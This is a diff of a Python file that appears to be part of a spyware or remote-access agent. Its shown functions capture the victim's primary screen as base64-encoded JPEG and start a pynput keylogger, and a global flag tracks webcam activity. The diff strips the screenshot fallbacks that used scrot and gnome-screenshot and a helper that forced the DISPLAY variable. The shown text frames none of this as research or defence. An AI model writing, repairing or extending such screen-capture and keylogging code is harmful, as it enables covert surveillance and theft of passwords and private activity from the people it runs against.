@@ -29,58 +29,19 @@ _webcam_active = False
 
 
 # ─── Screenshot ───────────────────────────────────────────────────────────────
-def _ensure_display():
-    """Set DISPLAY=:0 if not already set (common on Ubuntu desktops)."""
-    if not os.environ.get("DISPLAY"):
-        os.environ["DISPLAY"] = ":0"
-
-
 def take_screenshot():
-    _ensure_display()
-
-    # Strategy 1: mss (fast, pure-Python)
     try:
         import mss
         with mss.mss() as sct:
-            monitor = sct.monitors[1]
+            monitor = sct.monitors[1]           # primary monitor
             shot = sct.grab(monitor)
             from PIL import Image
             img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
             buf = io.BytesIO()
             img.save(buf, format="JPEG", quality=55)
             return base64.b64encode(buf.getvalue()).decode()
-    except Exception:
-        pass
-
-    # Strategy 2: scrot (apt install scrot)
-    try:
-        tmp = "/tmp/_agent_shot.jpg"
-        subprocess.run(
-            ["scrot", "-q", "55", tmp],
-            check=True, timeout=5,
-            env={**os.environ, "DISPLAY": os.environ.get("DISPLAY", ":0")},
-        )
-        with open(tmp, "rb") as f:
-            return base64.b64encode(f.read()).decode()
-    except Exception:
-        pass
-
-    # Strategy 3: gnome-screenshot
-    try:
-        tmp = "/tmp/_agent_shot.png"
-        subprocess.run(
-            ["gnome-screenshot", "-f", tmp],
-            check=True, timeout=5,
-            env={**os.environ, "DISPLAY": os.environ.get("DISPLAY", ":0")},
-        )
-        from PIL import Image
-        buf = io.BytesIO()
-        Image.open(tmp).save(buf, format="JPEG", quality=55)
-        return base64.b64encode(buf.getvalue()).decode()
-    except Exception:
-        pass
-
-    return None
+    except Exception as e:
+        return None
 
 
 # ─── Keylogger ────────────────────────────────────────────────────────────────
@@ -97,7 +58,6 @@ def start_keylog():
     global _keylog_listener
     if _keylog_listener is not None:
         return "Keylogger already running"
-    _ensure_display()
     from pynput import keyboard
     _keylog_listener = keyboard.Listener(on_press=_on_press)
     _keylog_listener.start()
